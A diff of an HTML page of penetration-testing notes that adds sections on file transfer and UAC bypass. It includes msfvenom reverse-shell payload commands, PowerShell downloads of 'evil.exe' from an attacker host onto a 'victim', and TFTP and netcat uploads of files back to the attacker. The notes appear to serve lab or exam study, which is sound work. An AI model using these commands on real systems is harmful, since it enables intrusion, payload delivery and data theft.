@@ -21,6 +21,8 @@
 <p id="info">Autorecon</p>
 <p id="codebox">python3 /opt/AutoRecon/autorecon.py $TARGET</p>
 
+<hr>
+
 
 <h1>MSFVenom Reverse Shell Payloads</h1>
 <p id="info">Staged Payloads for Windows - x86</p>
@@ -46,6 +48,8 @@
 
 <p id="info">HTA Payload</p>
 <p id="codebox">sudo msfvenom -p windows/shell_reverse_tcp LHOST=KALIIP LPORT=KALIPORT -f hta-psh -o evil.hta</p>
+
+<hr>
 
 
 <h1>Ports</h1>
@@ -86,6 +90,8 @@
 <p id="info"></p>
 <p id="codebox"></p>
 
+<hr>
+
 
 <h1>Privilege Escalation</h1>
 <h2>Windows</h2>
@@ -113,11 +119,56 @@
 <p id="codebox"><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">Guide to Exploit</a></p>
 
 <h2>Bypass UAC</h2>
+<p id="info">Event Viewer Bypass UAC</p>
+<p id="codebox"><a href="https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/">Guide to Exploit</a></p>
+<p id="codebox"><a href="">Script with steps on how to use it</a></p>
 
+
+<hr>
+
+<h1>Transfering Files</h1>
+<h2>Windows</h2>
+<p id="info">Windows Download file #1</p>
+<h4>Victim</h4>
+<p id="codebox">powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$KALIIP/evil.exe', 'evil.exe')</p>
+<p id="info">Windows Download file #2</p>
+<h4>Victim</h4>
+<p id="codebox">powershell -command { 
+    $cli = New-Object System.Net.WebClient; 
+    $cli.Headers['User-Agent'] = 'myUserAgentString'; 
+    $cli.DownloadFile('http://$KALIIP/evil.exe', 'C:\Users\Jeff_admin\Desktop\evil.exe') 
+} </p>
+<h2>TFTP</h2>
+<h4>Kali</h4>
+<p id="info">On Kali starts up tftp. All files will be put in /tftp</p>
+<p id="codebox">mkdir /tftp && chown nobody: /tftp && atftpd --daemon --port 69 /tftp</p>
+<h4>Victim</h4>
+<p id="info">Windows Download File #1</p>
+<p id="codebox">tftp -i $KALIIP get 1.exe</p>
+<p id="info">Windows Upload File #1</p>
+<p id="codebox">tftp -i $KaliIP put importantInfo.txt</p>
+
+<h2>SCP</h2>
+<p id="info">scp copy file back to Kali </p>
+<h4>Kali</h4>
+<p id="codebox">scp -P $portNum  $VictimUsername@$TARGET:/path/to/file/$fileName . </p>
+
+<h2>Netcat / NC</h2>
+<p id="info">Sending to victim #1</p>
+<h4>Victim (Receiver)</h4>
+<p id="codebox">nc.exe -nlvp 4455 > C:\Users\offsec\Desktop\$fileName.exe</p>
+<h4>Kali (Sender)</h4>
+<p id="codebox">nc -w 3 $TARGET 4455 < $fileName.exe</p>
+
+<h2>Python</h2>
+<p id="info">Setting up web server #1</p>
+<p id="codebox">python3 -m http.server 80</p>
+
+<hr>
 
 
 <h1>Macro Attacks</h1>
-<p id="codebox"><a href="/Scripts/Windows/Macros/macro.py">Turn hta into macro</a></p>
+<p id="codebox"><a href="https://github.com/JeffGThompson/offsec-notes.io/blob/main/Scripts/Windows/Macros/macro.py">Turn hta into macro</a></p>
 
 
 
